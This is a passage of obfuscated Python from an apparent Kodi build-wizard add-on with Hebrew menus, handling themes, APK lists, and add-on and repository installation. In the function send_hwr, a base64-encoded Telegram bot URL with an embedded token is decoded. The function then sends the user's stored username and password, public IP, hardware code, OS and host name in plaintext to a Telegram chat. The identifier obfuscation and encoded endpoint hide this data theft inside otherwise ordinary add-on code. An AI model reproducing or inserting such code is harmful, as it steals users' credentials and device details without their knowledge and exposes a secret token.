        addFile ('התקנה','install',OO00OOOO00OOO00OO ,'fresh',description =OO0O0O0000OOO0O0O ,fanart =O0O0O0O00OO000OO0 ,icon =O00O000O0OO0O0000 ,themeit =THEME1 )#line:2017
        if not O0O0000OO0OO0O0OO =='http://':#line:2020
            if wiz .workingURL (O0O0000OO0OO0O0OO )==True :#line:2021
                addFile (wiz .sep ('THEMES'),'',fanart =O0O0O0O00OO000OO0 ,icon =O00O000O0OO0O0000 ,themeit =THEME3 )#line:2022
                O0OO0OO00O00OOOO0 =wiz .openURL (O0O0000OO0OO0O0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2023
                OOOO00OOO00OOO0O0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO0OO00O00OOOO0 )#line:2024
                for O00O0000OOOO00OO0 ,OOOOOO00OOO0000O0 ,O00000OO0O0OO000O ,OO0OO0OO0OOOO000O ,OO000OO0O000O0OO0 ,OO0O0O0000OOO0O0O in OOOO00OOO00OOO0O0 :#line:2025
                    if not SHOWADULT =='true'and OO000OO0O000O0OO0 .lower ()=='yes':continue #line:2026
                    O00000OO0O0OO000O =O00000OO0O0OO000O if O00000OO0O0OO000O =='http://'else O00O000O0OO0O0000 #line:2027
                    OO0OO0OO0OOOO000O =OO0OO0OO0OOOO000O if OO0OO0OO0OOOO000O =='http://'else O0O0O0O00OO000OO0 #line:2028
                    addFile (O00O0000OOOO00OO0 if not O00O0000OOOO00OO0 ==BUILDTHEME else "[B]%s (Installed)[/B]"%O00O0000OOOO00OO0 ,'theme',OO00OOOO00OOO00OO ,O00O0000OOOO00OO0 ,description =OO0O0O0000OOO0O0O ,fanart =OO0OO0OO0OOOO000O ,icon =O00000OO0O0OO000O ,themeit =THEME3 )#line:2029
    setView ('files','viewType')#line:2030
def apkScraper (name =""):#line:2035
	if name =='kodi':#line:2036
		OOOO00OO0OO00O000 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2037
		O0OO0O00000OO0O0O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2038
		OOOOO0OO00OOO000O =wiz .openURL (OOOO00OO0OO00O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2039
		O000OOOO0OO00OO00 =wiz .openURL (O0OO0O00000OO0O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2040
		O00000OO0000O00OO =0 #line:2041
		OOO00OOO000000O00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOOOO0OO00OOO000O )#line:2042
		OOOO0OOOOOOOOOOO0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O000OOOO0OO00OO00 )#line:2043
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2045
		OOOO0O0O0OOO0O0OO =False #line:2046
		for OOO0O000O000OOOOO ,name ,OOOOOO0O00OO00O00 ,O0O000O0O00O00000 in OOO00OOO000000O00 :#line:2047
			if OOO0O000O000OOOOO in ['../','old/']:continue #line:2048
			if not OOO0O000O000OOOOO .endswith ('.apk'):continue #line:2049
			if not OOO0O000O000OOOOO .find ('_')==-1 and OOOO0O0O0OOO0O0OO ==True :continue #line:2050
			try :#line:2051
				OO00OOOOOO000O0OO =name .split ('-')#line:2052
				if not OOO0O000O000OOOOO .find ('_')==-1 :#line:2053
					OOOO0O0O0OOO0O0OO =True #line:2054
					O0000OOOOO00OOOOO ,O0OO0O0000OOOO00O =OO00OOOOOO000O0OO [2 ].split ('_')#line:2055
				else :#line:2056
					O0000OOOOO00OOOOO =OO00OOOOOO000O0OO [2 ]#line:2057
					O0OO0O0000OOOO00O =''#line:2058
				OO0OO0O0O0O00O0OO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OOOOOO000O0OO [0 ].title (),OO00OOOOOO000O0OO [1 ],O0OO0O0000OOOO00O .upper (),O0000OOOOO00OOOOO ,COLOR2 ,OOOOOO0O00OO00O00 .replace (' ',''),COLOR1 ,O0O000O0O00O00000 )#line:2059
				OOOO00O0O00O000OO =urljoin (OOOO00OO0OO00O000 ,OOO0O000O000OOOOO )#line:2060
				addFile (OO0OO0O0O0O00O0OO ,'apkinstall',"%s v%s%s %s"%(OO00OOOOOO000O0OO [0 ].title (),OO00OOOOOO000O0OO [1 ],O0OO0O0000OOOO00O .upper (),O0000OOOOO00OOOOO ),OOOO00O0O00O000OO )#line:2061
				O00000OO0000O00OO +=1 #line:2062
			except :#line:2063
				wiz .log ("Error on: %s"%name )#line:2064
		for OOO0O000O000OOOOO ,name ,OOOOOO0O00OO00O00 ,O0O000O0O00O00000 in OOOO0OOOOOOOOOOO0 :#line:2066
			if OOO0O000O000OOOOO in ['../','old/']:continue #line:2067
			if not OOO0O000O000OOOOO .endswith ('.apk'):continue #line:2068
			if not OOO0O000O000OOOOO .find ('_')==-1 :continue #line:2069
			try :#line:2070
				OO00OOOOOO000O0OO =name .split ('-')#line:2071
				OO0OO0O0O0O00O0OO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OOOOOO000O0OO [0 ].title (),OO00OOOOOO000O0OO [1 ],OO00OOOOOO000O0OO [2 ],COLOR2 ,OOOOOO0O00OO00O00 .replace (' ',''),COLOR1 ,O0O000O0O00O00000 )#line:2072
				OOOO00O0O00O000OO =urljoin (O0OO0O00000OO0O0O ,OOO0O000O000OOOOO )#line:2073
				addFile (OO0OO0O0O0O00O0OO ,'apkinstall',"%s v%s %s"%(OO00OOOOOO000O0OO [0 ].title (),OO00OOOOOO000O0OO [1 ],OO00OOOOOO000O0OO [2 ]),OOOO00O0O00O000OO )#line:2074
				O00000OO0000O00OO +=1 #line:2075
			except :#line:2076
				wiz .log ("Error on: %s"%name )#line:2077
		if O00000OO0000O00OO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2078
	elif name =='spmc':#line:2079
		OOO0OO0O00OO0O000 ='https://github.com/koying/SPMC/releases'#line:2080
		OOOOO0OO00OOO000O =wiz .openURL (OOO0OO0O00OO0O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2081
		O00000OO0000O00OO =0 #line:2082
		OOO00OOO000000O00 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OOOOO0OO00OOO000O )#line:2083
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2085
		for name ,OOOO000O00O0OOOO0 in OOO00OOO000000O00 :#line:2087
			O0OOO0O0O00O00O00 =''#line:2088
			OOOO0OOOOOOOOOOO0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OOOO000O00O0OOOO0 )#line:2089
			for O0O0OOO0OO00O0O0O ,OOOO0O000OOOOO0OO ,O0OO0OOOO0O000OO0 in OOOO0OOOOOOOOOOO0 :#line:2090
				if O0OO0OOOO0O000OO0 .find ('armeabi')==-1 :continue #line:2091
				if O0OO0OOOO0O000OO0 .find ('launcher')>-1 :continue #line:2092
				O0OOO0O0O00O00O00 =urljoin ('https://github.com',O0O0OOO0OO00O0O0O )#line:2093
				break #line:2094
		if O00000OO0000O00OO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2096
def apkMenu (url =None ):#line:2098
	if url ==None :#line:2099
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2102
	if not APKFILE =='http://':#line:2103
		if url ==None :#line:2104
			O000OO00OO0O00OOO =wiz .workingURL (APKFILE )#line:2105
			OO0000O0O00OO0O00 =uservar .APKFILE #line:2106
		else :#line:2107
			O000OO00OO0O00OOO =wiz .workingURL (url )#line:2108
			OO0000O0O00OO0O00 =url #line:2109
		if O000OO00OO0O00OOO ==True :#line:2110
			OO0000000000O0OO0 =wiz .openURL (OO0000O0O00OO0O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2111
			O000O00OO0000O000 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0000000000O0OO0 )#line:2112
			if len (O000O00OO0000O000 )>0 :#line:2113
				OOO00O0O0OOOO00O0 =0 #line:2114
				for OO0O0O0OO0OOOO0O0 ,OO00OO0O0OOO00000 ,url ,OOO0OOO0OOO00O00O ,O0O0O00OOO0O0OOOO ,OOO0OO00O00OO0000 ,O0OO0O000OO000000 in O000O00OO0000O000 :#line:2115
					if not SHOWADULT =='true'and OOO0OO00O00OO0000 .lower ()=='yes':continue #line:2116
					if OO00OO0O0OOO00000 .lower ()=='yes':#line:2117
						OOO00O0O0OOOO00O0 +=1 #line:2118
						addDir ("[B]%s[/B]"%OO0O0O0OO0OOOO0O0 ,'apk',url ,description =O0OO0O000OO000000 ,icon =OOO0OOO0OOO00O00O ,fanart =O0O0O00OOO0O0OOOO ,themeit =THEME3 )#line:2119
					else :#line:2120
						OOO00O0O0OOOO00O0 +=1 #line:2121
						addFile (OO0O0O0OO0OOOO0O0 ,'apkinstall',OO0O0O0OO0OOOO0O0 ,url ,description =O0OO0O000OO000000 ,icon =OOO0OOO0OOO00O00O ,fanart =O0O0O00OOO0O0OOOO ,themeit =THEME2 )#line:2122
					if OOO00O0O0OOOO00O0 <1 :#line:2123
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2124
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",5 )#line:2125
		else :#line:2126
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",5 )#line:2127
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2128
			addFile ('%s'%O000OO00OO0O00OOO ,'',themeit =THEME3 )#line:2129
		return #line:2130
	else :wiz .log ("[APK Menu] No APK list added.")#line:2131
	setView ('files','viewType')#line:2132
def addonMenu (url =None ):#line:2134
	if not ADDONFILE =='http://':#line:2135
		if url ==None :#line:2136
			OOOOO000O00OO0OOO =wiz .workingURL (ADDONFILE )#line:2137
			O000OOOO00OOO00O0 =uservar .ADDONFILE #line:2138
		else :#line:2139
			OOOOO000O00OO0OOO =wiz .workingURL (url )#line:2140
			O000OOOO00OOO00O0 =url #line:2141
		if OOOOO000O00OO0OOO ==True :#line:2142
			O00O0O0O0OOOOO00O =wiz .openURL (O000OOOO00OOO00O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2143
			OOOO0O00OO0OOOOOO =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00O0O0O0OOOOO00O )#line:2144
			if len (OOOO0O00OO0OOOOOO )>0 :#line:2145
				O0OO00000O0000O0O =0 #line:2146
				for O0O0O000000O0OOOO ,OO000OO0O0OO0O0OO ,url ,OO00000OO00OOOOO0 ,OOO0O00OO00O000OO ,O0O0OO0OO0O0O0OOO ,O00O00OOO000O00O0 ,OOOOOOO0O00O0O000 ,OOO0O00O0O0OO000O ,OO00000O00O0OOO0O in OOOO0O00OO0OOOOOO :#line:2147
					if OO000OO0O0OO0O0OO .lower ()=='section':#line:2148
						O0OO00000O0000O0O +=1 #line:2149
						addDir ("[B]%s[/B]"%O0O0O000000O0OOOO ,'addons',url ,description =OO00000O00O0OOO0O ,icon =O00O00OOO000O00O0 ,fanart =OOOOOOO0O00O0O000 ,themeit =THEME3 )#line:2150
					else :#line:2151
						if not SHOWADULT =='true'and OOO0O00O0O0OO000O .lower ()=='yes':continue #line:2152
						try :#line:2153
							O0OO000OOOO0O0O00 =xbmcaddon .Addon (id =OO000OO0O0OO0O0OO ).getAddonInfo ('path')#line:2154
							if os .path .exists (O0OO000OOOO0O0O00 ):#line:2155
								O0O0O000000O0OOOO ="[COLOR green][Installed][/COLOR] %s"%O0O0O000000O0OOOO #line:2156
						except :#line:2157
							pass #line:2158
						O0OO00000O0000O0O +=1 #line:2159
						addFile (O0O0O000000O0OOOO ,'addoninstall',OO000OO0O0OO0O0OO ,O000OOOO00OOO00O0 ,description =OO00000O00O0OOO0O ,icon =O00O00OOO000O00O0 ,fanart =OOOOOOO0O00O0O000 ,themeit =THEME2 )#line:2160
					if O0OO00000O0000O0O <1 :#line:2161
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2162
			else :#line:2163
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2164
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2165
		else :#line:2166
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2167
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2168
			addFile ('%s'%OOOOO000O00OO0OOO ,'',themeit =THEME3 )#line:2169
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2170
	setView ('files','viewType')#line:2171
def addonInstaller (O0O0O0OO0O0OOOOO0 ,O00OOO0OOO00O00O0 ):#line:2173
	if not ADDONFILE =='http://':#line:2174
		OOO00O000OO0OOOO0 =wiz .workingURL (O00OOO0OOO00O00O0 )#line:2175
		if OOO00O000OO0OOOO0 ==True :#line:2176
			OOO00O0O000OOO00O =wiz .openURL (O00OOO0OOO00O00O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2177
			OO000O00OOOOO00O0 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O0O0OO0O0OOOOO0 ).findall (OOO00O0O000OOO00O )#line:2178
			if len (OO000O00OOOOO00O0 )>0 :#line:2179
				for O000OOO0OOO000000 ,O00OOO0OOO00O00O0 ,OOOOO00OOOOOO0OOO ,O000O0OO0O000O0O0 ,O00O0OOO0OOO0OOOO ,OOOOOOOOO0OO0OOOO ,OO00OO00OOO000000 ,OOO0OOOO00000O000 ,O0OOO00OO00O0OO0O in OO000O00OOOOO00O0 :#line:2180
					if os .path .exists (os .path .join (ADDONS ,O0O0O0OO0O0OOOOO0 )):#line:2181
						O00O000000OOO0OOO =['Launch Addon','Remove Addon']#line:2182
						OO0O0O00O00OO00O0 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O00O000000OOO0OOO )#line:2183
						if OO0O0O00O00OO00O0 ==0 :#line:2184
							wiz .ebi ('RunAddon(%s)'%O0O0O0OO0O0OOOOO0 )#line:2185
							xbmc .sleep (1000 )#line:2186
							return True #line:2187
						elif OO0O0O00O00OO00O0 ==1 :#line:2188
							wiz .cleanHouse (os .path .join (ADDONS ,O0O0O0OO0O0OOOOO0 ))#line:2189
							try :wiz .removeFolder (os .path .join (ADDONS ,O0O0O0OO0O0OOOOO0 ))#line:2190
							except :pass #line:2191
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0O0O0OO0O0OOOOO0 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2192
								removeAddonData (O0O0O0OO0O0OOOOO0 )#line:2193
							wiz .refresh ()#line:2194
							return True #line:2195
						else :#line:2196
							return False #line:2197
					O00000000OO00O00O =os .path .join (ADDONS ,OOOOO00OOOOOO0OOO )#line:2198
					if not OOOOO00OOOOOO0OOO .lower ()=='none'and not os .path .exists (O00000000OO00O00O ):#line:2199
						wiz .log ("Repository not installed, installing it")#line:2200
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O0O0O0OO0O0OOOOO0 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOOO00OOOOOO0OOO ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2201
							O00OOO0O00OO0OOO0 =wiz .parseDOM (wiz .openURL (O000O0OO0O000O0O0 ),'addon',ret ='version',attrs ={'id':OOOOO00OOOOOO0OOO })#line:2202
							if len (O00OOO0O00OO0OOO0 )>0 :#line:2203
								O00O0O0O0O00OO0O0 ='%s%s-%s.zip'%(O00O0OOO0OOO0OOOO ,OOOOO00OOOOOO0OOO ,O00OOO0O00OO0OOO0 [0 ])#line:2204
								wiz .log (O00O0O0O0O00OO0O0 )#line:2205
								if KODIV >=17 :wiz .addonDatabase (OOOOO00OOOOOO0OOO ,1 )#line:2206
								installAddon (OOOOO00OOOOOO0OOO ,O00O0O0O0O00OO0O0 )#line:2207
								wiz .ebi ('UpdateAddonRepos()')#line:2208
								wiz .log ("Installing Addon from Kodi")#line:2210
								OOO0O0000O00O0OOO =installFromKodi (O0O0O0OO0O0OOOOO0 )#line:2211
								wiz .log ("Install from Kodi: %s"%OOO0O0000O00O0OOO )#line:2212
								if OOO0O0000O00O0OOO :#line:2213
									wiz .refresh ()#line:2214
									return True #line:2215
							else :#line:2216
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OOOOO00OOOOOO0OOO )#line:2217
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O0O0O0OO0O0OOOOO0 ,OOOOO00OOOOOO0OOO ))#line:2218
					elif OOOOO00OOOOOO0OOO .lower ()=='none':#line:2219
						wiz .log ("No repository, installing addon")#line:2220
						OOOOO000OO0O00OO0 =O0O0O0OO0O0OOOOO0 #line:2221
						OOO00OOOOOO000O0O =O00OOO0OOO00O00O0 #line:2222
						installAddon (O0O0O0OO0O0OOOOO0 ,O00OOO0OOO00O00O0 )#line:2223
						wiz .refresh ()#line:2224
						return True #line:2225
					else :#line:2226
						wiz .log ("Repository installed, installing addon")#line:2227
						OOO0O0000O00O0OOO =installFromKodi (O0O0O0OO0O0OOOOO0 ,False )#line:2228
						if OOO0O0000O00O0OOO :#line:2229
							wiz .refresh ()#line:2230
							return True #line:2231
					if os .path .exists (os .path .join (ADDONS ,O0O0O0OO0O0OOOOO0 )):return True #line:2232
					OOO0OO0O00O000O0O =wiz .parseDOM (wiz .openURL (O000O0OO0O000O0O0 ),'addon',ret ='version',attrs ={'id':O0O0O0OO0O0OOOOO0 })#line:2233
					if len (OOO0OO0O00O000O0O )>0 :#line:2234
						O00OOO0OOO00O00O0 ="%s%s-%s.zip"%(O00OOO0OOO00O00O0 ,O0O0O0OO0O0OOOOO0 ,OOO0OO0O00O000O0O [0 ])#line:2235
						wiz .log (str (O00OOO0OOO00O00O0 ))#line:2236
						if KODIV >=17 :wiz .addonDatabase (O0O0O0OO0O0OOOOO0 ,1 )#line:2237
						installAddon (O0O0O0OO0O0OOOOO0 ,O00OOO0OOO00O00O0 )#line:2238
						wiz .refresh ()#line:2239
					else :#line:2240
						wiz .log ("no match");return False #line:2241
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2242
		else :wiz .log ("[Addon Installer] Text File: %s"%OOO00O000OO0OOOO0 )#line:2243
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2244
def installFromKodi (O000O0O00OOOO0O0O ,over =True ):#line:2246
	if over ==True :#line:2247
		xbmc .sleep (2000 )#line:2248
	wiz .ebi ('RunPlugin(plugin://%s)'%O000O0O00OOOO0O0O )#line:2250
	if not wiz .whileWindow ('yesnodialog'):#line:2251
		return False #line:2252
	xbmc .sleep (1000 )#line:2253
	if wiz .whileWindow ('okdialog'):#line:2254
		return False #line:2255
	wiz .whileWindow ('progressdialog')#line:2256
	if os .path .exists (os .path .join (ADDONS ,O000O0O00OOOO0O0O )):return True #line:2257
	else :return False #line:2258
def installAddon (OOO00O0OOO000000O ,OO00O0000OOOOOO00 ):#line:2260
	if not wiz .workingURL (OO00O0000OOOOOO00 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OOO00O0OOO000000O ,COLOR2 ));return #line:2261
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2262
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00O0OOO000000O )+'\n'+''+'\n'+'[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2263
	O000OOOOOOO0000OO =OO00O0000OOOOOO00 .split ('/')#line:2264
	OO0OO00O0OO000O00 =os .path .join (PACKAGES ,O000OOOOOOO0000OO [-1 ])#line:2265
	try :os .remove (OO0OO00O0OO000O00 )#line:2266
	except :pass #line:2267
	downloader .download (OO00O0000OOOOOO00 ,OO0OO00O0OO000O00 ,DP )#line:2268
	O0OOO0OO000000O00 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00O0OOO000000O )#line:2269
	DP .update (0 ,O0OOO0OO000000O00 +'\n'+''+'\n'+'[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2270
	O00O0OOOOO0000OOO ,OO000OOOO0O0OOO00 ,O000OO000O0O00O00 =extract .all (OO0OO00O0OO000O00 ,ADDONS ,DP ,title =O0OOO0OO000000O00 )#line:2271
	DP .update (0 ,O0OOO0OO000000O00 +'\n'+''+'\n'+'[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2272
	installed (OOO00O0OOO000000O )#line:2273
	installDep (OOO00O0OOO000000O ,DP )#line:2274
	DP .close ()#line:2275
	wiz .ebi ('UpdateAddonRepos()')#line:2276
	wiz .ebi ('UpdateLocalAddons()')#line:2277
	wiz .refresh ()#line:2278
def installDep (OO00O0O00O0O0O00O ,DP =None ):#line:2280
	OO0OO000OO0O0OOOO =os .path .join (ADDONS ,OO00O0O00O0O0O00O ,'addon.xml')#line:2281
	if os .path .exists (OO0OO000OO0O0OOOO ):#line:2282
		O0O0000O00OOOOOO0 =open (OO0OO000OO0O0OOOO ,mode ='r');OOO0OO0OOO0OO000O =O0O0000O00OOOOOO0 .read ();O0O0000O00OOOOOO0 .close ();#line:2283
		OOOOOOOO000000000 =wiz .parseDOM (OOO0OO0OOO0OO000O ,'import',ret ='addon')#line:2284
		for O0OO0000OO0000O0O in OOOOOOOO000000000 :#line:2285
			if not 'xbmc.python'in O0OO0000OO0000O0O :#line:2286
				if not DP ==None :#line:2287
					DP .update (0 +'\n'+''+'\n'+'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO0000OO0000O0O ))#line:2288
def installed (O00000OO0O0OO0OOO ):#line:2316
	O0O0O00OOOOO0O00O =os .path .join (ADDONS ,O00000OO0O0OO0OOO ,'addon.xml')#line:2317
	if os .path .exists (O0O0O00OOOOO0O00O ):#line:2318
		try :#line:2319
			OOOO00000OOOO0000 =open (O0O0O00OOOOO0O00O ,mode ='r');O000O0OO00OO000OO =OOOO00000OOOO0000 .read ();OOOO00000OOOO0000 .close ()#line:2320
			OO0OO00OO00O00OO0 =wiz .parseDOM (O000O0OO00OO000OO ,'addon',ret ='name',attrs ={'id':O00000OO0O0OO0OOO })#line:2321
			OOOOOO0OOOO0OO00O =os .path .join (ADDONS ,O00000OO0O0OO0OOO ,'icon.png')#line:2322
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OO00OO00O00OO0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOOOOO0OOOO0OO00O )#line:2323
		except :pass #line:2324
def passandpin ():#line:2327
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2328
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2329
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2330
def passandUsername ():#line:2331
	ADDON .openSettings ()#line:2333
def folderback ():#line:2335
    OO000O0OOOO00OO0O =wiz .getS ("path")#line:2336
    if OO000O0OOOO00OO0O :#line:2337
      OO000O0OOOO00OO0O =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2338
      ADDON .setSetting ("path",OO000O0OOOO00OO0O )#line:2339
def user_sync ():#line:2340
    O00OOO0OOOOOO000O =(wiz .getS ("sync_user"))#line:2341
    try :#line:2342
        O000O0OOO000000O0 =xbmcaddon .Addon ('plugin.program.mediasync')#line:2343
        O000O0OOO000000O0 .setSetting ('firebase',O00OOO0OOOOOO000O )#line:2344
        O000O0OOO000000O0 .setSetting ('sync_mod','true')#line:2345
    except :pass #line:2346
    try :#line:2347
        O0000OOO000OO00O0 =xbmcaddon .Addon ('plugin.video.telemedia')#line:2348
        O0000OOO000OO00O0 .setSetting ('firebase',O00OOO0OOOOOO000O )#line:2349
        O0000OOO000OO00O0 .setSetting ('sync_mod','true')#line:2350
    except :pass #line:2351
    try :#line:2352
        O000OOO000000OO00 =xbmcaddon .Addon ('plugin.video.mando')#line:2353
        O000OOO000000OO00 .setSetting ('firebase',O00OOO0OOOOOO000O )#line:2354
        O000OOO000000OO00 .setSetting ('sync_mod','true')#line:2355
    except :pass #line:2356
    try :#line:2357
        OOOO0OO000000OOO0 =xbmcaddon .Addon ('script.module.xtvsh')#line:2358
        OOOO0OO000000OOO0 .setSetting ('firebase',O00OOO0OOOOOO000O )#line:2359
        OOOO0OO000000OOO0 .setSetting ('sync_mod','true')#line:2360
    except :pass #line:2361
    try :#line:2362
        OO0OOOO0O000OO000 =xbmcaddon .Addon ('plugin.video.thorrent')#line:2363
        OO0OOOO0O000OO000 .setSetting ('firebase',O00OOO0OOOOOO000O )#line:2364
        OO0OOOO0O000OO000 .setSetting ('sync_mod','true')#line:2365
    except :pass #line:2366
    try :#line:2367
        OO00O00000OOO0OO0 =xbmcaddon .Addon ('context.myfav')#line:2368
        OO00O00000OOO0OO0 .setSetting ('firebase',O00OOO0OOOOOO000O )#line:2369
        OO00O00000OOO0OO0 .setSetting ('sync_mod','true')#line:2370
    except :pass #line:2371
def rdon ():#line:2375
	O0O00OO0O0O0OOO0O =translatepath ('special://home/media')+"/SplashRd.png"#line:2377
	OOOOOO0O000000OOO =translatepath ('special://home/media')+"/Splash.png"#line:2378
	copyfile (O0O00OO0O0O0OOO0O ,OOOOOO0O000000OOO )#line:2379
def send_hwr ():#line:2381
       xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:2382
       try :#line:2383
          import json #line:2385
          wiz .log ('FRESH MESSAGE')#line:2386
          O00OO0000000O0O0O =(wiz .getS ("user"))#line:2387
          OOO00OOOOO00O0OOO =(wiz .getS ("pass"))#line:2388
          OOOO0O00OO0000OO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2389
          OO0OOO000OOOO0O0O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:2390
          OO0000OO00OO0O0OO =urlopen ('https://api.ipify.org/?format=json').read ()#line:2391
          O00O00000OOOO0O00 =str (json .loads (OO0000OO00OO0O0OO )['ip'])#line:2392
          OO0OOO0O0OOO0O000 =O00OO0000000O0O0O #line:2393
          O0OOOOO000O00OO00 =OOO00OOOOO00O0OOO #line:2394
          import socket #line:2395
          OOOO0OOOO0O000O00 =platform .uname ()#line:2396
          O00OOO0O0O00OO00O =OOOO0OOOO0O000O00 [1 ]#line:2397
          OO0000OO00OO0O0OO =urlopen (OO0OOO000OOOO0O0O +que ('שלח קוד: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OO0OOO0O0OOO0O000 +que (' סיסמה: ')+O0OOOOO000O00OO00 +que (' קודי: ')+OOOO0O00OO0000OO0 +que (' כתובת: ')+O00O00000OOOO0O00 +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O00OOO0O0O00OO00O ).readlines ()#line:2398
          OO0000OO00OO0O0OO =urlopen (OO0OOO000OOOO0O0O +HARDWAER )#line:2399
          xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:2401
          wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]נשלח[/COLOR]'%COLOR2 )#line:2402
       except :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אין קוד פנה למנהל[/COLOR]'%COLOR2 )#line:2403
       xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:2404
def backmyupbuild ():#line:2405
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2407
